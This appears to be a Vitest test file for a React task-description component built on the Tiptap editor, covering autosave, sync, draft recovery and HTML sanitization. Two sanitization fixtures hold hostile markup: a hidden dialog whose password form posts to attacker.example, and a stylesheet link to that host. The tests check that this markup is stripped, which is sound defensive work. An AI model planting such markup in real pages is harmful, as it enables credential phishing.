import { type ReactNode } from "react";
import { act, cleanup, render } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import type { Editor } from "@tiptap/react";
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import { useAuthStore } from "@/stores/auth-store";
import { toast } from "sonner";
import { TaskDescription } from "./task-description";

const { http, editors } = vi.hoisted(() => ({
  http: { patch: vi.fn(), get: vi.fn(), post: vi.fn(), delete: vi.fn() },
  editors: [] as unknown[],
}));
vi.mock("@/lib/api-client", () => ({ api: http }));
vi.mock("@tiptap/react", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@tiptap/react")>();
  return {
    ...actual,
    useEditor: (...args: Parameters<typeof actual.useEditor>) => {
      const editor = actual.useEditor(...args);
      if (editor && !editors.includes(editor)) editors.push(editor);
      return editor;
    },
  };
});
vi.mock("sonner", () => ({
  toast: { error: vi.fn(), success: vi.fn(), dismiss: vi.fn() },
}));

let client: QueryClient;
let suffix = 0;
function wrapper({ children }: { children: ReactNode }) {
  return <QueryClientProvider client={client}>{children}</QueryClientProvider>;
}
async function tick(ms = 0) {
  await act(async () => {
    await vi.advanceTimersByTimeAsync(ms);
  });
}
function currentEditor() {
  return editors.at(-1) as Editor;
}
beforeEach(() => {
  vi.useFakeTimers();
  editors.length = 0;
  client = new QueryClient({
    defaultOptions: { queries: { retry: false }, mutations: { retry: false } },
  });
  useAuthStore.setState({
    user: {
      id: "task-editor-user",
      email: "editor@example.test",
      displayName: "Editor",
      avatarUrl: null,
      phone: null,
      jobTitle: null,
      timezone: null,
      emailVerified: true,
    },
  });
  http.patch.mockImplementation(
    (path: string, options: { json: Record<string, unknown> }) => ({
      json: async () => ({
        data: {
          id: path.split("/").pop(),
          projectId: "project",
          ...options.json,
        },
      }),
    }),
  );
});
afterEach(async () => {
  cleanup();
  await tick(10);
  client.clear();
  vi.clearAllMocks();
  vi.useRealTimers();
});

it("real Tiptap editor remounts for another task and flushes pending text to the original ID", async () => {
  const a = `task-a-${++suffix}`,
    b = `task-b-${suffix}`;
  const screen = render(
    <TaskDescription taskId={a} description="<p>Original A</p>" canEdit />,
    { wrapper },
  );
  await tick();
  const original = currentEditor();
  act(() => {
    original.commands.setContent("<p>Unsaved A</p>");
  });
  screen.rerender(
    <TaskDescription taskId={b} description="<p>Original B</p>" canEdit />,
  );
  await tick(10);
  expect(currentEditor()).not.toBe(original);
  expect(currentEditor().getHTML()).toBe("<p>Original B</p>");
  expect(http.patch).toHaveBeenCalledTimes(1);
  expect(http.patch).toHaveBeenCalledWith(`tasks/${a}`, {
    json: { description: "<p>Unsaved A</p>" },
    context: { expectedUserId: "task-editor-user" },
  });
});

it("real Tiptap syncs idle remote updates without an update loop and protects dirty local text", async () => {
  const id = `task-sync-${++suffix}`;
  const screen = render(
    <TaskDescription taskId={id} description="<p>Initial</p>" canEdit />,
    { wrapper },
  );
  await tick();
  screen.rerender(
    <TaskDescription taskId={id} description="<p>Remote update</p>" canEdit />,
  );
  await tick();
  expect(currentEditor().getHTML()).toBe("<p>Remote update</p>");
  expect(http.patch).not.toHaveBeenCalled();
  act(() => {
    currentEditor().commands.setContent("<p>Local draft</p>");
  });
  screen.rerender(
    <TaskDescription
      taskId={id}
      description="<p>Another remote update</p>"
      canEdit
    />,
  );
  await tick();
  expect(currentEditor().getHTML()).toBe("<p>Local draft</p>");
  await tick(801);
  expect(http.patch).toHaveBeenCalledWith(`tasks/${id}`, {
    json: { description: "<p>Local draft</p>" },
    context: { expectedUserId: "task-editor-user" },
  });
  expect(currentEditor().getHTML()).toBe("<p>Local draft</p>");
});

it("a refetch of the just-saved description keeps the caret in place", async () => {
  const id = `task-caret-${++suffix}`;
  const screen = render(
    <TaskDescription taskId={id} description="<p>Hello</p>" canEdit />,
    { wrapper },
  );
  await tick();
  const editor = currentEditor();
  act(() => {
    editor.commands.setContent("<p>Hello world again</p>");
    editor.commands.setTextSelection(6);
  });
  await tick(801);
  expect(http.patch).toHaveBeenCalledTimes(1);
  // The detail GET invalidated by the save returns the text that was saved.
  screen.rerender(
    <TaskDescription
      taskId={id}
      description="<p>Hello world again</p>"
      canEdit
    />,
  );
  await tick();
  expect(editor.getHTML()).toBe("<p>Hello world again</p>");
  expect(editor.state.selection.from).toBe(6);
  await tick(801);
  expect(http.patch).toHaveBeenCalledTimes(1);
});

it("does not persist a prior identity's pending task description under a new identity", async () => {
  const id = `task-identity-${++suffix}`;
  const screen = render(
    <TaskDescription taskId={id} description="<p>Server</p>" canEdit />,
    { wrapper },
  );
  await tick();
  act(() => {
    currentEditor().commands.setContent("<p>Alice draft</p>");
  });
  act(() => {
    useAuthStore.setState({
      user: { ...useAuthStore.getState().user!, id: "bob" },
    });
  });
  await tick();
  expect(http.patch).not.toHaveBeenCalled();
  expect(currentEditor().getHTML()).toBe("<p>Server</p>");
  act(() => {
    useAuthStore.setState({
      user: { ...useAuthStore.getState().user!, id: "task-editor-user" },
    });
  });
  await tick();
  // The draft returns only as an explicit offer; the editor shows the server text.
  expect(currentEditor().getHTML()).toBe("<p>Server</p>");
  expect(screen.getByRole("status").textContent).toContain(
    "Earlier changes to this description were not saved",
  );
  expect(http.patch).not.toHaveBeenCalled();
  act(() => {
    screen.getByText("Restore changes").click();
  });
  await tick();
  expect(currentEditor().getHTML()).toBe("<p>Alice draft</p>");
  expect(http.patch).toHaveBeenCalledWith(`tasks/${id}`, {
    json: { description: "<p>Alice draft</p>" },
    context: { expectedUserId: "task-editor-user" },
  });
});

it("a failing autosave shows only its retry notice, not a generic error per attempt", async () => {
  const id = `task-failure-${++suffix}`;
  http.patch.mockImplementation(() => ({
    json: async () => {
      throw new Error("Offline");
    },
  }));
  const screen = render(
    <TaskDescription taskId={id} description="<p>Server</p>" canEdit />,
    { wrapper },
  );
  await tick();
  act(() => {
    currentEditor().commands.setContent("<p>Offline draft</p>");
  });
  await tick(801);
  expect(screen.getByRole("alert").textContent).toContain("Changes not saved");
  const messages = vi
    .mocked(toast.error)
    .mock.calls.map(([message]) => message);
  expect(messages).toEqual([
    "Your changes couldn't be saved. Retry before closing this tab.",
  ]);
});

it("R1c: a failed description draft is offered on reopen, not shown or replayed over a newer description", async () => {
  const id = `task-r1c-${++suffix}`;
  let offline = true;
  const patch = http.patch.getMockImplementation()!;
  http.patch.mockImplementation((path: string, options: any) =>
    offline
      ? {
          json: async () => {
            throw new TypeError("Failed to fetch");
          },
        }
      : patch(path, options),
  );
  const first = render(
    <TaskDescription taskId={id} description="<p>Server</p>" canEdit />,
    { wrapper },
  );
  await tick();
  act(() => {
    currentEditor().commands.setContent("<p>Alice stale</p>");
  });
  // Closing inside the debounce saves immediately; that save fails.
  first.unmount();
  await tick();
  expect(http.patch).toHaveBeenCalledTimes(1);
  offline = false;
  // Someone else has since saved a newer description.
  const reopened = render(
    <TaskDescription taskId={id} description="<p>Bob newer</p>" canEdit />,
    { wrapper },
  );
  await tick();
  expect(currentEditor().getHTML()).toBe("<p>Bob newer</p>");
  expect(reopened.getByRole("status").textContent).toContain(
    "Earlier changes to this description were not saved",
  );
  reopened.unmount();
  await tick(801);
  expect(http.patch).toHaveBeenCalledTimes(1);
});

it("a failed description is only resent when the user retries it", async () => {
  const id = `task-retry-${++suffix}`;
  let offline = true;
  const patch = http.patch.getMockImplementation()!;
  http.patch.mockImplementation((path: string, options: any) =>
    offline
      ? {
          json: async () => {
            throw new TypeError("Failed to fetch");
          },
        }
      : patch(path, options),
  );
  const screen = render(
    <TaskDescription taskId={id} description="<p>Server</p>" canEdit />,
    { wrapper },
  );
  await tick();
  act(() => {
    currentEditor().commands.setContent("<p>Draft</p>");
  });
  await tick(801);
  expect(http.patch).toHaveBeenCalledTimes(1);
  offline = false;
  screen.unmount();
  await tick(801);
  expect(http.patch).toHaveBeenCalledTimes(1);
});

it("idle sync shows a newer description while a set-aside draft stays offered and unsent", async () => {
  const id = `task-sync-parked-${++suffix}`;
  let offline = true;
  const patch = http.patch.getMockImplementation()!;
  http.patch.mockImplementation((path: string, options: any) =>
    offline
      ? {
          json: async () => {
            throw new TypeError("Failed to fetch");
          },
        }
      : patch(path, options),
  );
  const first = render(
    <TaskDescription taskId={id} description="<p>Server</p>" canEdit />,
    { wrapper },
  );
  await tick();
  act(() => {
    currentEditor().commands.setContent("<p>Set aside</p>");
  });
  first.unmount();
  await tick();
  offline = false;
  const reopened = render(
    <TaskDescription taskId={id} description="<p>Server</p>" canEdit />,
    { wrapper },
  );
  await tick();
  reopened.rerender(
    <TaskDescription taskId={id} description="<p>Newer</p>" canEdit />,
  );
  await tick(801);
  expect(currentEditor().getHTML()).toBe("<p>Newer</p>");
  expect(reopened.getByText("Restore changes")).toBeTruthy();
  expect(http.patch).toHaveBeenCalledTimes(1);
});

// A task created from a template before every write path sanitized its
// description can still hold markup like this.
const LEGACY_DESCRIPTION =
  "<p>Legacy <strong>notes</strong></p>" +
  "<style>body{display:none}</style>" +
  '<button command="show-modal" commandfor="own">Open</button>' +
  '<dialog id="own"><form action="https://attacker.example/login">' +
  '<input type="password"></form></dialog>' +
  '<div popover id="pop">Popover</div>' +
  '<button popovertarget="pop">Show</button>' +
  "<svg><style>#root{outline:9px solid red}</style></svg>";

it("a reader's view of a legacy description shows its text but none of its active markup", async () => {
  const screen = render(
    <TaskDescription
      taskId={`task-legacy-${++suffix}`}
      description={LEGACY_DESCRIPTION}
      canEdit={false}
    />,
    { wrapper },
  );
  await tick();
  const view = screen.container.querySelector(".prose")!;
  expect(view.innerHTML).toBe(
    "<p>Legacy <strong>notes</strong></p>OpenPopoverShow",
  );
  // Tiptap injects its own editor styles; nothing else may add a sheet.
  expect(
    document.querySelectorAll("style:not([data-tiptap-style]), link"),
  ).toHaveLength(0);
  expect(getComputedStyle(document.body).display).not.toBe("none");
});

it("an editor opened on a legacy description loads only its text and formatting", async () => {
  const id = `task-legacy-edit-${++suffix}`;
  const screen = render(
    <TaskDescription taskId={id} description={LEGACY_DESCRIPTION} canEdit />,
    { wrapper },
  );
  await tick();
  expect(currentEditor().getHTML()).toBe(
    "<p>Legacy <strong>notes</strong></p><p>OpenPopoverShow</p>",
  );
  expect(
    screen.container.querySelectorAll(
      "style, dialog, button[command], [popover], [popovertarget], svg",
    ),
  ).toHaveLength(0);
});

// jsdom has no ClipboardEvent; EditorView.pasteHTML creates one.
class TestClipboardEvent extends Event {
  readonly clipboardData = null;
}

function captureClipboardDocuments() {
  vi.stubGlobal("ClipboardEvent", TestClipboardEvent);
  const created: Document[] = [];
  const createHTMLDocument = document.implementation.createHTMLDocument.bind(
    document.implementation,
  );
  const spy = vi
    .spyOn(document.implementation, "createHTMLDocument")
    .mockImplementation((title?: string) => {
      const doc = createHTMLDocument(title);
      created.push(doc);
      return doc;
    });
  return {
    created,
    restore: () => {
      spy.mockRestore();
      vi.unstubAllGlobals();
    },
  };
}

it("pasted style sheets never reach the document prosemirror-view inlines styles from", async () => {
  const id = `task-paste-style-${++suffix}`;
  render(<TaskDescription taskId={id} description="<p></p>" canEdit />, {
    wrapper,
  });
  await tick();
  const clipboard = captureClipboardDocuments();
  act(() => {
    currentEditor().view.pasteHTML(
      '<meta charset="utf-8"><style>.cb{font-weight:bold}</style>' +
        '<link rel="stylesheet" href="https://attacker.example/x.css">' +
        '<p><span class="cb">Pasted</span> text</p>' +
        "<svg><style>p{color:red}</style></svg>" +
        "<noscript><style>p{color:red}</style></noscript>",
    );
  });
  clipboard.restore();
  expect(clipboard.created.length).toBeGreaterThan(0);
  for (const doc of clipboard.created) {
    expect(doc.querySelectorAll("style, link, meta")).toHaveLength(0);
    expect(doc.styleSheets).toHaveLength(0);
  }
  await tick(801);
  expect(http.patch).toHaveBeenCalledWith(`tasks/${id}`, {
    json: { description: "<p>Pasted text</p>" },
    context: { expectedUserId: "task-editor-user" },
  });
});

it("an ordinary rich-text paste is stored as before", async () => {
  const id = `task-paste-plain-${++suffix}`;
  render(<TaskDescription taskId={id} description="<p></p>" canEdit />, {
    wrapper,
  });
  await tick();
  const clipboard = captureClipboardDocuments();
  act(() => {
    currentEditor().view.pasteHTML(
      "<meta charset='utf-8'><h2>Heading</h2>" +
        '<p><strong>Bold</strong>, <em>italic</em>, <s>struck</s> and <a href="https://example.com/a?b=1&amp;c=2">a link</a></p>' +
        '<ul><li>One</li><li>Two</li></ul><ol start="4"><li>Four</li></ol>' +
        "<blockquote><p>Quoted</p></blockquote><pre><code>x &lt; y</code></pre>" +
        '<p style="font-weight:bold">Inline styled</p><table><tr><td>Cell</td></tr></table>',
    );
  });
  clipboard.restore();
  await tick(801);
  expect(http.patch).toHaveBeenCalledWith(`tasks/${id}`, {
    json: {
      description:
        "<h2>Heading</h2>" +
        '<p><strong>Bold</strong>, <em>italic</em>, <s>struck</s> and <a target="_blank" rel="noopener noreferrer nofollow" href="https://example.com/a?b=1&amp;c=2">a link</a></p>' +
        '<ul><li><p>One</p></li><li><p>Two</p></li></ul><ol start="4"><li><p>Four</p></li></ol>' +
        "<blockquote><p>Quoted</p></blockquote><pre><code>x &lt; y</code></pre>" +
        "<p><strong>Inline styled</strong></p><p>Cell</p>",
    },
    context: { expectedUserId: "task-editor-user" },
  });
});
